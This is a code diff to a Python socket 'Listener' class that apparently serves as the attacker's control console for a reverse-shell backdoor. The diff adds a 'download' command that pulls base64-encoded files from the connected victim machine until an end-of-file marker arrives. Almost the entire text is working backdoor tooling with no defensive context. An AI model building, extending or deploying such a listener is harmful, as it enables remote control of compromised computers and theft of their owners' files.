@@ -1,6 +1,7 @@
 #!/usr/bin/env python
 # https://docs.python.org/2/library/socket.html
 # https://www.tutorialspoint.com/python/python_networking.htm
+import base64
 import json
 import socket
 
@@ -13,12 +14,12 @@ class Listener:
         listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         listener.bind((ip, port))
         listener.listen(0)
-        print("[+] Waiting fro incoming connections")
+        print("[+] Waiting for incoming connections")
         self.connection, address = listener.accept()
         print("[+] Got a connection from " + str(address))
 
     def reliable_send(self, data):
-        json_data = json.dumps(self.decode(data))
+        json_data = json.dumps(data)
         self.connection.send(json_data.encode())
 
     def reliable_receive(self):
@@ -36,8 +37,48 @@ class Listener:
         if command[0] == "exit":
             self.connection.close()
             exit()
+        elif command[0] == "download" and len(command) > 1:
+            return self.receive_file(command[1])
 
         return self.reliable_receive()
+
+    def receive_file(self, path):
+        total_receive = 0
+        file = open(path, "wb")
+        while True:
+            encoded = self.connection.recv(1024)
+            byte_data = base64.b64decode(encoded)
+            if not byte_data:
+                print("The End")
+                break
+            if encoded == base64.b64encode(b""):
+                print("The End B")
+                break
+
+            eof = b"pp-00-11-22-ff"
+            if encoded == base64.b64encode(eof):
+                print("[+] Got EOF flag. Finishing...")
+                break
+            if encoded.endswith(base64.b64encode(eof)):
+                print("[+] Got EOF flag. Extracting end of the file...")
+                file.write(byte_data)
+                total_receive += len(byte_data)
+                break
+            file.write(byte_data)
+            total_receive += len(byte_data)
+
+        file.close()
+        # print(self.read_file(path))
+        return "[+] Download successful. File size " + str(total_receive) + " bytes"
+
+    def read_file(self, path):
+        with open(path, "rb") as file:
+            return base64.b64encode(file.read())
+
+    def write_file(self, path, content):
+        with open(path, "wb") as file:
+            file.write(base64.b64decode(content))
+            return "[+] Download successful"
 
     def run(self):
         while True:
